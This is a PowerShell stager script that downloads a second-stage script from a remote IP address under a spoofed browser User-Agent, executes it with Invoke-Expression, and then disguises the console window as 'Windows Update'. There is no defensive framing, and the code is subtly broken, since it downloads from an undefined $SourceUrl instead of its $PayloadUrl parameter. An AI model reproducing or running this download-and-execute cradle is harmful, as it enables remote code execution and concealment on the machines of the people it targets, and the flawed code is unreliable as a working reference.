
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://198.51.100.99:8443/stage2.ps1',
    [int]$RequestTimeout = 143
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$ScriptText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($ScriptText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $ScriptText.Length)
Invoke-Expression $ScriptText

$Host.UI.RawUI.WindowTitle = "Windows Update"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 10 initialized"
